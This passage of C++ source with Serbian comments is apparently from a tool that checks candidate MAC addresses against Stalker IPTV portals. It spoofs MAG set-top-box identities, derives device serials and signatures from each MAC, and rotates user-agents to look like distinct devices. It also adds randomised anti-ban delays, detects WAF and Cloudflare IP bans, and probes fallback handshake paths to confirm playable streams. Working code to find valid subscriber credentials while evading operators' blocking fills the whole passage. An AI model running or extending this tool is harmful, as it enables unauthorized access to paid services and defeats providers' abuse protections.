    // probePortalAlive — brza provera dostupnosti portala
    // Vraća: 1=OK, 2=MRTAV (timeout/no conn), 3=BAN IP (403/520/429)
    // ─────────────────────────────────────────────────────────────
    int probePortalAlive(const QString &portal) {
        QString portalFixed = portal.trimmed();
        {
            QRegularExpression reEmptyPort(R"(^(https?://[^/:]+):/(?!\d))");
            if (reEmptyPort.match(portalFixed).hasMatch())
                portalFixed.replace(reEmptyPort, "\\1/");
        }

QString base = extractBaseUrlSafe(portalFixed);
        auto    hp   = parseHostPort(base);
        QString host = hp.first;
        int     port = hp.second;

        // ── EXTRA DEBUG: TCP ping na originalnom portu + alternative ──
        {
            QList<int> testPorts = {port, 80, 8080, 443, 8443, 4022, 25461};
            for (int tp : testPorts) {
                bool ok = tcpPing(host, tp, 1500);
                qDebug() << "[TCP PROBE]" << host << "port=" << tp << (ok ? "OPEN" : "closed");
            }
        }

        // ── EXTRA DEBUG: raw cpr GET na više URL varijanti ──
        {
            QStringList rawUrls = {
                portalFixed,
                QString("http://%1:%2/").arg(host).arg(port),
                QString("http://%1:%2/c/").arg(host).arg(port),
                QString("http://%1/c/").arg(host),
                QString("http://%1:8080/c/").arg(host),
                QString("https://%1/c/").arg(host),
            };
            for (const QString &ru : rawUrls) {
                try {
                    cpr::Response rr = cpr::Get(
                        cpr::Url{ru.toStdString()},
                        cpr::Timeout{3000},
                        cpr::VerifySsl{false},
                        cpr::Redirect{false},
                        cpr::Header{{"User-Agent", "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"}, {"Accept", "*/*"}}
                    );
                    std::string loc = rr.header.count("Location") ? rr.header.at("Location") : "";
                    std::string ct  = rr.header.count("Content-Type") ? rr.header.at("Content-Type") : "";
                    qDebug() << "[RAW PROBE]" << ru
                             << "status=" << rr.status_code
                             << "err=" << (int)rr.error.code
                             << "errMsg=" << QString::fromStdString(rr.error.message)
                             << "CT=" << QString::fromStdString(ct).left(40)
                             << "Location=" << QString::fromStdString(loc)
                             << "body[:100]=" << QString::fromStdString(rr.text).left(100);
                } catch (const std::exception &ex) {
                    qDebug() << "[RAW PROBE EXCEPTION]" << ru << QString::fromStdString(ex.what());
                } catch (...) {
                    qDebug() << "[RAW PROBE EXCEPTION]" << ru << "unknown";
                }
            }
        }
        // ── END EXTRA DEBUG ──

        // ── Korak 1: TCP ping — najbrža provera ──
        bool tcpOk = tcpPing(host, port, 2500);
        if (!tcpOk) {
            // Fallback: ako je port 80, proba 8080
            if (port == 80 && tcpPing(host, 8080, 1500))
                return 1; // 8080 je otvoren — normalni tok će odraditi ostatak
            qDebug() << "[PORTAL PROBE]" << base << "TCP FAIL → MRTAV";
            return 2; // Ni jedan port ne odgovara
        }

        // ── Korak 2: HTTP probe na /c/ ──
        QString probeUrl = base + "/c/";
        try {
            cpr::Response r = cpr::Get(
                cpr::Url{probeUrl.toStdString()},
                cpr::Timeout{m_stopRequested.load() ? 200 : 5000},
                cpr::VerifySsl{false},
                cpr::Header{
                    {"User-Agent", "Mozilla/5.0 (QtEmbedded; U; Linux; C) "
                                   "AppleWebKit/533.3 (KHTML, like Gecko) "
                                   "MAG200 stbapp ver: 2 rev: 250 Safari/533.3"},
                    {"Accept",     "*/*"},
                    {"Connection", "close"}
                }
            );

            int sc = r.status_code;
            qDebug() << "[PORTAL PROBE]" << probeUrl
                     << "status:" << sc
                     << "body[:80]:" << QString::fromStdString(r.text).left(80);

            if (sc == 0)                                          return 2; // Timeout
            if (sc == 521 || sc == 522 || sc == 523 || sc == 524) return 2; // CF origin down
            if (sc == 403 || sc == 520 || sc == 429)              return 3; // IP ban
            // Sve ostalo (200, 301, 302, 404, 500...) = server živ
            return 1;

        } catch (...) {
            return 2; // Exception = nema konekcije
        }
    }

    // ─────────────────────────────────────────────────────────────
    // testStreamUrl — JEDINI sudija: da li stream vraća pravi media?
    // Vraća true SAMO ako dobijemo stvarne media bajtove.
    // Nema SMART ACCEPT, nema fallback-a na registraciju.
    // ─────────────────────────────────────────────────────────────
   bool testStreamUrl(const QString &realUrl, const cpr::Header &headers) {
    if (realUrl.isEmpty() || !realUrl.startsWith("http")) return false;
    if (m_stopRequested.load()) return false;

    std::string body;
    bool stoppedEarly = false;
    int finalStatus   = 0;

    try {
        cpr::Response rs = cpr::Get(
            cpr::Url{realUrl.toStdString()},
            cpr::Timeout{m_stopRequested.load() ? 200 : 14000},
            cpr::VerifySsl{false},
            headers,
            cpr::WriteCallback{[&](const std::string_view d, intptr_t) -> bool {
                body.append(d.data(), d.size());
                if (body.size() >= 8192) { stoppedEarly = true; return false; }
                return true;
            }}
        );

        // Ako je WriteCallback zaustavio prenos, rs.status_code može biti 0
        // Koristimo cached status iz response objekta ili pretpostavljamo 200
        finalStatus = rs.status_code;
            qDebug() << "[RAW STATUS]" << realUrl.left(60)
                     << "rs.status_code=" << rs.status_code
                     << "stoppedEarly=" << stoppedEarly
                     << "body.size=" << body.size()
                     << "error=" << (int)rs.error.code
                     << "errorMsg=" << QString::fromStdString(rs.error.message);
            if (stoppedEarly && finalStatus == 0) finalStatus = 200;

        qDebug() << "[STREAM TEST]" << realUrl.left(80)
                 << "status:" << finalStatus
                 << "bytes:" << body.size()
                 << "stoppedEarly:" << stoppedEarly;

        if (!body.empty() && body.size() <= 32)
            qDebug() << "  hex:" << QByteArray(body.data(), (int)body.size()).toHex();

        // Permamentni fail
        if (finalStatus == 401 || finalStatus == 403 ||
            finalStatus == 404 || finalStatus == 405) return false;

        // Timeout ili connection error bez podataka
        if (finalStatus == 0 && body.empty()) return false;

        // Privremeni server error — tretiramo kao neodređeno, ne fail
        if ((finalStatus == 502 || finalStatus == 503) && body.empty()) return false;

        // Samo 200/206 ili stoppedEarly (koji znači da smo dobili podatke)
        if (!stoppedEarly && finalStatus != 200 && finalStatus != 206) return false;

        // HTML/JSON Content-Type = nije stream
        std::string ct = rs.header.count("Content-Type")
                         ? rs.header.at("Content-Type") : "";
        std::transform(ct.begin(), ct.end(), ct.begin(), ::tolower);
        if (ct.find("text/html")        != std::string::npos) return false;
        if (ct.find("application/json") != std::string::npos) return false;

        // ── Minimalni podaci ──
        if (body.size() < 32) return false;

        // ── M3U8 playlist ──
        if (body.size() >= 7 && body.substr(0, 7) == "#EXTM3U") {
            qDebug() << "[STREAM TEST] ✅ M3U8";
            return true;
        }

        // ── MP4 / fMP4 box (ftyp/moov/moof na offsetu 4) ──
        if (body.size() >= 8) {
            std::string box4 = body.substr(4, 4);
            if (box4 == "ftyp" || box4 == "moov" || box4 == "moof" || box4 == "mdat") {
                qDebug() << "[STREAM TEST] ✅ MP4";
                return true;
            }
        }

        // ── MPEG-TS sync byte 0x47 ──
        // Traži 0x47 na pozicijama 0, 4 (sa 4-byte timestamp), ili bilo gde u prvih 376 bajta
        if (body.size() >= 188) {
            for (size_t startOff = 0; startOff < qMin(body.size(), (size_t)376); startOff++) {
                if ((unsigned char)body[startOff] != 0x47) continue;
                // Proveri da li postoji sledeći paket na +188
                if (startOff + 188 < body.size() &&
                    (unsigned char)body[startOff + 188] == 0x47) {
                    qDebug() << "[STREAM TEST] ✅ MPEG-TS at offset=" << startOff;
                    return true;
                }
            }
        }

        // ── MPEG Audio sync (0xFF 0xFB/FA/F3 itd.) ──
        if (body.size() >= 4 &&
            (unsigned char)body[0] == 0xFF &&
            ((unsigned char)body[1] & 0xE0) == 0xE0) {
            qDebug() << "[STREAM TEST] ✅ MPEG Audio";
            return true;
        }

        // ── Catch-all: dovoljno podataka, nije HTML, ima CT koji liči na media ──
        if (body.size() >= 256) {
            bool ctIsMedia = ct.empty()                               ||
                             ct.find("video")    != std::string::npos ||
                             ct.find("audio")    != std::string::npos ||
                             ct.find("octet")    != std::string::npos ||
                             ct.find("mpeg")     != std::string::npos ||
                             ct.find("stream")   != std::string::npos ||
                             ct.find("mpegurl")  != std::string::npos ||
                             ct.find("mp4")      != std::string::npos;
            if (ctIsMedia) {
                qDebug() << "[STREAM TEST] ✅ Catch-all bytes=" << body.size()
                         << "CT=" << QString::fromStdString(ct);
                return true;
            }
        }

        // ── Poslednji resort: stoppedEarly + dovoljno podataka + nije text ──
        if (stoppedEarly && body.size() >= 256 &&
            ct.find("text/plain") == std::string::npos) {
            qDebug() << "[STREAM TEST] ✅ StoppedEarly fallback bytes=" << body.size();
            return true;
        }

        qDebug() << "[STREAM TEST] ❌ bytes=" << body.size()
                 << "CT=" << QString::fromStdString(ct);
        return false;

    } catch (...) { return false; }
}

    // ─────────────────────────────────────────────────────────────
    // checkMacPlayable — čista stream-bazirana logika
    // Handshake → profile → main_info → channels → create_link → stream
    // JEDINI kriterijum: da li stream vraća pravi media sadržaj
    // ─────────────────────────────────────────────────────────────
    bool checkMacPlayable(const QString &portal, const QString &mac, CheckResultMac &out) {
        out.isValid = false;
        out.mac     = mac;
        out.portal  = portal;

auto dbg = [&](const QString &step, const QString &msg) {
            qDebug().nospace() << "[MAC] " << mac << " | " << step << " → " << msg;
        };

        auto stepDelay = [&](int minMs, int maxMs) {
            if (m_stopRequested.load()) return;
            thread_local std::mt19937 _rng_sd(std::random_device{}());
            std::uniform_int_distribution<int> _d_sd(minMs, maxMs);
            std::this_thread::sleep_for(std::chrono::milliseconds(_d_sd(_rng_sd)));
        };

// ── Gradi apiBase iz portal URL-a ──
        // Sanitizacija: "http://host:/path" → "http://host/path" (prazan port)
        QString portalFixed = portal.trimmed();
        {
            QRegularExpression reEmptyPort(R"(^(https?://[^/:]+):/(?!\d))");
            if (reEmptyPort.match(portalFixed).hasMatch())
                portalFixed.replace(reEmptyPort, "\\1/");
        }
        QString apiBase;
        {
            QString pt = portalFixed;
            if (pt.endsWith("/c/", Qt::CaseInsensitive)) pt.chop(3);
            else if (pt.endsWith("/c", Qt::CaseInsensitive)) pt.chop(2);
            if (!pt.endsWith("/")) pt += "/";
            apiBase = pt;
        }

        QString macUpper = mac.trimmed().toUpper();

        // ── Device parametri (MAG250 emulacija) ──
QString macClean = macUpper; macClean.remove(":");

        // ── SN: MD5(macUpper)[0:13] — Python kompatibilno ──
        QString sn;
        {
            QByteArray md5input = macUpper.toUtf8();
            QByteArray md5result = QCryptographicHash::hash(md5input, QCryptographicHash::Md5);
            sn = QString::fromLatin1(md5result.toHex()).left(13).toUpper();
        }

        // ── deviceId: SHA256(macUpper).upper() — Python kompatibilno ──
        QString deviceId;
        {
            QByteArray sha256input = macUpper.toUtf8();
            QByteArray sha256result = QCryptographicHash::hash(sha256input, QCryptographicHash::Sha256);
            deviceId = QString::fromLatin1(sha256result.toHex()).toUpper();
        }
        qDebug() << "[DEVICE_PARAMS]" << macUpper
                 << "sn=" << sn
                 << "deviceId[:16]=" << deviceId.left(16);

        // ── signature: SHA256(sn + deviceId[0:32] + macClean).upper() ──
        QString signature;
        {
            QString src = sn + deviceId.left(32) + macClean;
            QByteArray sha256input = src.toUtf8();
            QByteArray sha256result = QCryptographicHash::hash(sha256input, QCryptographicHash::Sha256);
            signature = QString::fromLatin1(sha256result.toHex()).toUpper();
        }

        QString macForCookie = macUpper; macForCookie.replace(":", "%3A");
        std::string cookieStr = "mac=" + macForCookie.toStdString() +
                                "; stb_lang=en; timezone=Europe%2FParis" +
                                "; adid=" + sn.toStdString();

        QUrl portalUrl(portalFixed);
        QString portalHost = portalUrl.host();
        int portalPort = portalUrl.port();
        if (portalPort <= 0) portalPort = 80;
        QString serverKey = portalHost + ":" + QString::number(portalPort);

        // ── Session UA: svaki MAC dobija drugačiji UA — izgleda kao različit uređaj ──
        static const std::vector<std::string> magUaList = {
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG250 stbapp ver: 2 rev: 250 Safari/533.3",
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG254 stbapp ver: 2 rev: 256 Safari/533.3",
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG256 stbapp ver: 2 rev: 273 Safari/533.3",
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 1442 Safari/533.3",
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG324 stbapp ver: 4 rev: 1442 Safari/533.3",
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG351 stbapp ver: 5 rev: 1832 Safari/533.3",
            "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG420 stbapp ver: 5 rev: 1986 Safari/533.3",
        };
        thread_local std::mt19937 rng_ua(std::random_device{}());
        std::uniform_int_distribution<int> uaDist(0, (int)magUaList.size()-1);
        std::string sessionUa = magUaList[uaDist(rng_ua)];

auto makeHeaders = [&](const QString &tkn = "") -> cpr::Header {
            cpr::Header h;
            h["User-Agent"]      = sessionUa;  
            h["Accept"]          = "*/*";
            h["Accept-Encoding"] = "gzip";
            h["Pragma"]          = "no-cache";
            h["X-User-Agent"]    = "Model: MAG250; Link: WiFi";
            h["Host"]            = (portalPort != 80 && portalPort != 443)
                                   ? (portalHost + ":" + QString::number(portalPort)).toStdString()
                                   : portalHost.toStdString();
            // Token u Cookie (server/load.php format) i kao Bearer
            std::string cookieFull = cookieStr;
            if (!tkn.isEmpty()) {
                cookieFull += "; token=" + tkn.toStdString();
                h["Authorization"] = "Bearer " + tkn.toStdString();
            }
            h["Cookie"]     = cookieFull;
            h["Connection"] = "Keep-Alive";
            return h;
        };

if (m_stopRequested.load()) return false;

        // ═══ DIJAGNOSTIČKA SONDA — jednom po portalu ═══
        {
            static std::mutex probeMutex;
            static QSet<QString> probedBases;
            bool shouldProbe = false;
            {
                std::lock_guard<std::mutex> lk(probeMutex);
                QString probeKey = extractBaseUrlSafe(portalFixed);
                if (!probedBases.contains(probeKey)) {
                    probedBases.insert(probeKey);
                    shouldProbe = true;
                }
            }
            if (shouldProbe && !m_stopRequested.load()) {
                std::thread([=]() {
                QString probeBase = extractBaseUrlSafe(portalFixed);
                QString httpsBase = "https://" + portalHost;
                QStringList probePaths = {
                    "/",
                    "/c/",
                    "/stalker_portal/",
                    "/stalker_portal/c/",
                    "/stalker_portal/server/load.php",
                    "/server/load.php",
                    "/api/",
                };
                qDebug() << "═══════════════════════════════════════";
                qDebug() << "[PROBE START]" << probeBase;
                qDebug() << "═══════════════════════════════════════";
                for (const QString &path : probePaths) {
                    if (m_stopRequested.load()) break;
                    QString probeUrl = probeBase + path;
                    try {
                        cpr::Response pr = cpr::Get(
                            cpr::Url{probeUrl.toStdString()},
                            cpr::Timeout{2000},
                            cpr::VerifySsl{false},
                            cpr::Header{
                                {"User-Agent", "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3"},
                                {"Accept", "*/*"}
                            });
                        std::string loc = pr.header.count("Location")     ? pr.header.at("Location")     : "";
                        std::string ct  = pr.header.count("Content-Type") ? pr.header.at("Content-Type") : "";
                        qDebug() << "[PROBE HTTP ]" << probeUrl
                                 << "\n  → status:" << pr.status_code
                                 << "| CT:" << QString::fromStdString(ct).left(50)
                                 << "| Location:" << QString::fromStdString(loc)
                                 << "\n  → body[:200]:" << QString::fromStdString(pr.text).left(200);
                    } catch (...) {
                        qDebug() << "[PROBE HTTP ]" << probeUrl << "→ EXCEPTION/TIMEOUT";
                    }
                }
                // HTTPS varijante
                QStringList httpsPaths = {
                    "/stalker_portal/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml",
                    "/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml",
                    "/c/",
                };
                for (const QString &path : httpsPaths) {
                    if (m_stopRequested.load()) break;
                    QString probeUrl = httpsBase + path;
                    try {
                        cpr::Response pr = cpr::Get(
                            cpr::Url{probeUrl.toStdString()},
                            cpr::Timeout{4000},
                            cpr::VerifySsl{false},
                            cpr::Header{{"User-Agent", "Mozilla/5.0"}, {"Accept", "*/*"}});
                        std::string loc = pr.header.count("Location")     ? pr.header.at("Location")     : "";
                        std::string ct  = pr.header.count("Content-Type") ? pr.header.at("Content-Type") : "";
                        qDebug() << "[PROBE HTTPS]" << probeUrl
                                 << "\n  → status:" << pr.status_code
                                 << "| CT:" << QString::fromStdString(ct).left(50)
                                 << "| Location:" << QString::fromStdString(loc)
                                 << "\n  → body[:200]:" << QString::fromStdString(pr.text).left(200);
                    } catch (...) {
                        qDebug() << "[PROBE HTTPS]" << probeUrl << "→ EXCEPTION/TIMEOUT";
                    }
                }
                qDebug() << "═══════════════════════════════════════";
                qDebug() << "[PROBE END]";
                qDebug() << "═══════════════════════════════════════";
                }).detach();
            }
        }

        qDebug() << "[TIMING] checkMacPlayable START:"
                 << QDateTime::currentDateTime().toString("HH:mm:ss.zzz")
                 << macUpper;

        // Anti-ban: random pauza između API koraka — prilagođena serveru
        auto antibanSleep = [&](int minMs, int maxMs) {
            if (m_stopRequested.load()) return;
            auto* rt = getReactThrottle(serverKey);
            bool aggressive = false;
            { std::lock_guard<std::mutex> lk(rt->mx); aggressive = rt->isAggressive; }
            // Za agresivne servere: puni delay; za normalne: 1/4 delay-a
            int effectiveMin = aggressive ? minMs : qMax(20,  minMs  / 6);
            int effectiveMax = aggressive ? maxMs : qMax(50,  maxMs  / 6);
            thread_local std::mt19937 _rng_ab(std::random_device{}());
            std::uniform_int_distribution<int> _d_ab(effectiveMin, effectiveMax);
            std::this_thread::sleep_for(std::chrono::milliseconds(_d_ab(_rng_ab)));
        };

        // ═══ KORAK 1: Handshake ═══
        bool    m_useServerLoad = false; // true = server koristi server/load.php umesto portal.php
        QString token;
        {
const int delays[]   = {0, 1500, 4000};
            const int timeouts[] = {4000, 6000, 8000};
            bool handshakeOk = false;

            auto parseToken = [&](const std::string &body) -> bool {
                try {
                    auto j = json::parse(body);
                    if (j.contains("js") && j["js"].is_object() &&
                        j["js"].contains("token") && j["js"]["token"].is_string()) {
                        token = QString::fromStdString(j["js"]["token"].get<std::string>());
                        return !token.isEmpty();
                    }
                } catch (...) {}
                return false;
            };

            bool wafBanDetected = false; // flag za portal-level IP ban

             auto tryHandshakeUrl = [&](const QString &url, int attempt, int timeout) -> int {
                // Vraća: 1=OK, 0=permFail(403/404), -1=tempFail(retry)
                if (m_stopRequested.load()) return 0;
                // Adaptivni throttle: 400ms za normalne, 1800ms za agresivne portale
                {
                    auto* rt = getReactThrottle(serverKey);
                    bool aggressive = false;
                    { std::lock_guard<std::mutex> lk(rt->mx); aggressive = rt->isAggressive; }
                    int hsDelay = aggressive ? 1200 : 200;
                    throttleServerRequest(serverKey, hsDelay);
                }
                // Ako je server već bio u CF banu, koristi kratak timeout
                bool knownCfBan = false;
                {
                    auto* banS = getBanState(serverKey);
                    knownCfBan = banS->inCooldown;
                }
                int effectiveTimeout = m_stopRequested.load() ? 200
                    : (knownCfBan ? 1000 : timeout);
                cpr::Response r = cpr::Get(
                    cpr::Url{url.toStdString()},
                    cpr::Timeout{effectiveTimeout},
                    cpr::VerifySsl{false}, makeHeaders());
                qDebug() << "[HANDSHAKE]" << macUpper
                         << "attempt" << attempt
                         << "status:" << r.status_code
                         << "err_code:" << (int)r.error.code
                         << "err_msg:" << QString::fromStdString(r.error.message)
                         << "url:" << QString::fromStdString(r.url.str()).left(80)
                         << "body:" << QString::fromStdString(r.text).left(200);

                // ── ANTI-BAN DEBUG: loguj SVE headere koje server vraća ──
                qDebug() << "[HANDSHAKE RESP HEADERS]" << macUpper;
                for (const auto &hdr : r.header)
                    qDebug() << "  " << QString::fromStdString(hdr.first)
                             << ":" << QString::fromStdString(hdr.second);

                // ── ANTI-BAN DEBUG: loguj SVE headere koje šaljemo ──
                qDebug() << "[HANDSHAKE REQ HEADERS SENT]" << macUpper;
                cpr::Header sentH = makeHeaders();
                for (const auto &hdr : sentH)
                    qDebug() << "  " << QString::fromStdString(hdr.first)
                             << ":" << QString::fromStdString(hdr.second);
                reactiveReport(serverKey, r.status_code);
                    if (r.status_code == 200 && !r.text.empty()) {
                    if (parseToken(r.text)) return 1;
                    qDebug() << "[HANDSHAKE 200 NO TOKEN]" << macUpper
                             << "full_body:" << QString::fromStdString(r.text).left(400);
                    std::string bodyLow = r.text;
                    std::transform(bodyLow.begin(), bodyLow.end(), bodyLow.begin(), ::tolower);
                    if (bodyLow.size() < 150 &&
                        (bodyLow.find("blocked") != std::string::npos ||
                         bodyLow.find("access denied") != std::string::npos)) {
                        qDebug() << "[HANDSHAKE] Portal IP BAN (Blocked/Access Denied) on"
                                 << serverKey << "→ hard IP ban, 24h cooldown";
                        reactiveReport(serverKey, 429);
                        if (!isServerBanned(serverKey)) {
                            QString _now = QDateTime::currentDateTime().toString("dd.MM.yyyy HH:mm:ss");
                            emit portalProbeReport(QString("Portal: %1\nStatus: 🔒 IP BAN (Access Denied)\nVreme: %2  BAN IP na 24h — pokušaj ponovo sutra\n").arg(portal, _now));
                        }
                        recordWafBan(serverKey, 86400);
                        wafBanDetected = true;
                        m_stopRequested.store(true, std::memory_order_release);
                        return 0;
                    }
                    return 0;
                }
                if (r.status_code == 403) {
                    if (!r.text.empty() && r.text.find("blip") != std::string::npos) {
                        qDebug() << "[HANDSHAKE] WAF blip 403 on" << serverKey
                                 << "→ server-side block, 1h cooldown";
                        reactiveReport(serverKey, 429);
                        if (!isServerBanned(serverKey)) {
                            QString _now = QDateTime::currentDateTime().toString("dd.MM.yyyy HH:mm:ss");
                            emit portalProbeReport(QString("Portal: %1\nStatus: 🔒 SERVER-SIDE IP BLOCK (HTTP 403)\nVreme: %2  BAN IP na 1h — pokušaj ponovo za sat vremena\n").arg(portal, _now));
                        }
                        recordWafBan(serverKey, 3600);
                        wafBanDetected = true;
                        m_stopRequested.store(true, std::memory_order_release);
                        return 0;
                    }
                    return 0;
                }
                if (r.status_code == 429) {
                    recordHandshakeFail(serverKey);
                    return -1;
                }
                if (r.status_code == 503) {
                    return -1;
                }
                if (r.status_code == 301 || r.status_code == 302 ||
                    r.status_code == 307 || r.status_code == 308) {
                    std::string location = r.header.count("Location") ? r.header.at("Location") : "";
                    qDebug() << "[HANDSHAKE REDIRECT]" << macUpper
                             << "→" << QString::fromStdString(location);
                    return 0;
                }
                if (r.status_code == 404) return 0;
                if (r.status_code == 520 || r.status_code == 521 ||
                    r.status_code == 522 || r.status_code == 523 ||
                    r.status_code == 524) {
                    std::string cfRay = r.header.count("CF-RAY")
                        ? r.header.at("CF-RAY") : "";
                    if (!cfRay.empty()) {
                        qDebug() << "[HANDSHAKE] Cloudflare IP ban (520/CF-RAY) na"
                                 << serverKey << "→ WAF ban 24h";
                        if (!isServerBanned(serverKey)) {
                            QString _now = QDateTime::currentDateTime().toString("dd.MM.yyyy HH:mm:ss");
                            emit portalProbeReport(QString("Portal: %1\nStatus: 🔒 CLOUDFLARE IP BAN (HTTP 520)\nVreme: %2  BAN IP na 24h — pokušaj ponovo sutra\n").arg(portal, _now));
                        }
                        recordWafBan(serverKey, 86400);
                        wafBanDetected = true;
                        m_stopRequested.store(true, std::memory_order_release);
                        return 0;
                    }
                }
                return -1;
            };

            // Pokušaj primarni URL (3 puta sa backoff-om)
            QString primaryUrl = apiBase + "portal.php?type=stb&action=handshake&JsHttpRequest=1-xml";
            for (int a = 0; a < 3 && !m_stopRequested.load() && !handshakeOk; ++a) {
                if (delays[a] > 0) {
                    for (int i = 0; i < delays[a]/500 && !m_stopRequested.load(); i++)
                        std::this_thread::sleep_for(std::chrono::milliseconds(500));
                }
                int res = tryHandshakeUrl(primaryUrl, a+1, timeouts[a]);
                if (res == 1)  { handshakeOk = true; break; }
                if (res == 0)  break; // permanentni fail
                // res == -1: nastavi sa sledećim pokušajem
            }

            // Sačuvaj originalni apiBase pre port 8080 fallback-a (za stalker_portal detekciju)
            QString originalApiBase = apiBase;

            // Fallback: port 80 → 8080 (samo ako TCP ping prođe)
            if (!handshakeOk && !m_stopRequested.load() && !wafBanDetected &&
                portalUrl.port() <= 0 && portalPort == 80) {
                bool port8080open = tcpPing(portalHost, 8080, 1500);
                qDebug() << "[8080 TCP PING]" << portalHost << "port8080open=" << port8080open;
                if (port8080open) {
                    portalPort = 8080;
                    apiBase    = portalUrl.scheme() + "://" + portalHost + ":8080/";
                    serverKey  = portalHost + ":8080";
                    QString url8080 = apiBase + "portal.php?type=stb&action=handshake&JsHttpRequest=1-xml";
                    for (int a = 0; a < 3 && !m_stopRequested.load() && !handshakeOk; ++a) {
                        if (delays[a] > 0) {
                            for (int i = 0; i < delays[a]/500 && !m_stopRequested.load(); i++)
                                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                        }
                        int res = tryHandshakeUrl(url8080, a+1, timeouts[a]);
                        if (res == 1)  { handshakeOk = true; break; }
                        if (res == 0)  break;
                    }
                    if (!handshakeOk && !m_stopRequested.load() &&
                        originalApiBase.contains("stalker_portal", Qt::CaseInsensitive)) {
                        QString stalker8080Base = portalUrl.scheme() + "://" + portalHost + ":8080/stalker_portal/";
                        QString urlStalker8080  = stalker8080Base + "portal.php?type=stb&action=handshake&JsHttpRequest=1-xml";
                        qDebug() << "[HANDSHAKE STALKER+8080]" << macUpper << urlStalker8080;
                        for (int a2 = 0; a2 < 2 && !m_stopRequested.load() && !handshakeOk; ++a2) {
                            if (delays[a2] > 0) {
                                for (int i = 0; i < delays[a2]/500 && !m_stopRequested.load(); i++)
                                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
                            }
                            int res2 = tryHandshakeUrl(urlStalker8080, a2+1, timeouts[a2]);
                            if (res2 == 1) { apiBase = stalker8080Base; handshakeOk = true; break; }
                            if (res2 == 0) break;
                        }
                    }
                } else {
                    // Port 8080 zatvoren — ostaje na port 80
                    portalPort = 80;
                    apiBase    = portalUrl.scheme() + "://" + portalHost + "/";
                    serverKey  = portalHost + ":80";
                }
            } // kraj port 80→8080 bloka

            // Fallback: stalker_portal putanja
            if (!handshakeOk && !m_stopRequested.load() && !wafBanDetected &&
                !apiBase.contains("stalker_portal", Qt::CaseInsensitive)) {
                QString stalkerBase = extractBaseUrlSafe(portal) + "/stalker_portal/";
                QString stalkerUrl  = stalkerBase + "portal.php?type=stb&action=handshake&JsHttpRequest=1-xml";
                qDebug() << "[HANDSHAKE STALKER]" << macUpper << stalkerUrl;
                for (int a = 0; a < 2 && !m_stopRequested.load() && !handshakeOk; ++a) {
                    if (a > 0) {
                        for (int i = 0; i < 6 && !m_stopRequested.load(); i++)
                            std::this_thread::sleep_for(std::chrono::milliseconds(500));
                    }
                    int res = tryHandshakeUrl(stalkerUrl, a+1, timeouts[a]);
                    if (res == 1) { apiBase = stalkerBase; handshakeOk = true; break; }
                    if (res == 0) break;
                }
            }

            // Fallback: root /portal.php (za portale sa stalker_portal u URL-u)
            if (!handshakeOk && !m_stopRequested.load() && !wafBanDetected) {
                QString rootBase = extractBaseUrlSafe(portalFixed) + "/";
                QString rootUrl  = rootBase + "portal.php?type=stb&action=handshake&JsHttpRequest=1-xml";
                QString currentPrimary = apiBase + "portal.php?type=stb&action=handshake&JsHttpRequest=1-xml";
                if (rootUrl != currentPrimary) {
                    qDebug() << "[HANDSHAKE ROOT]" << macUpper << rootUrl;
                    for (int a = 0; a < 2 && !m_stopRequested.load() && !handshakeOk; ++a) {
                        if (a > 0) {
                            for (int i = 0; i < 6 && !m_stopRequested.load(); i++)
                                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                        }
                        int res = tryHandshakeUrl(rootUrl, a+1, timeouts[a]);
                        if (res == 1) { apiBase = rootBase; handshakeOk = true; break; }
                        if (res == 0) break;
                    }
                }
            }

            // Fallback: server/load.php (stariji Stalker serveri koji nemaju portal.php)
            if (!handshakeOk && !m_stopRequested.load() && !wafBanDetected) {
                QStringList serverLoadBases;
                serverLoadBases << originalApiBase + "server/load.php";
                if (!originalApiBase.contains("stalker_portal", Qt::CaseInsensitive))
                    serverLoadBases << extractBaseUrlSafe(portalFixed) + "/stalker_portal/server/load.php";

                for (const QString &loadUrl : serverLoadBases) {
                    if (handshakeOk || m_stopRequested.load()) break;
                    QString fullLoadUrl = loadUrl + "?type=stb&action=handshake&JsHttpRequest=1-xml";
                    qDebug() << "[HANDSHAKE SERVER/LOAD]" << macUpper << fullLoadUrl;
                    for (int a = 0; a < 2 && !m_stopRequested.load() && !handshakeOk; ++a) {
                        if (a > 0) {
                            for (int i = 0; i < 6 && !m_stopRequested.load(); i++)
                                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                        }
                        int res = tryHandshakeUrl(fullLoadUrl, a+1, timeouts[a]);
                        if (res == 1) {
                            // Odredi novi apiBase: sve do i uključujući /stalker_portal/
                            int idx = loadUrl.toLower().indexOf("/stalker_portal/");
                            if (idx >= 0)
                                apiBase = loadUrl.left(idx) + "/stalker_portal/";
                            else {
                                // Izvuci prefiks putanje pre "/server/load.php"
                                // Npr: "http://balkanius.info/xyc/server/load.php" → "http://balkanius.info/xyc/"
                                int serverIdx = loadUrl.toLower().indexOf("/server/load.php");
                                if (serverIdx >= 0)
                                    apiBase = loadUrl.left(serverIdx + 1);
                                else
                                    apiBase = extractBaseUrlSafe(portalFixed) + "/";
                            }
                            m_useServerLoad = true; // ← FLAG: koristi server/load.php za sve akcije
                            handshakeOk = true;
                            break;
                        }
                        if (res == 0) break;
                    }
                }
            }

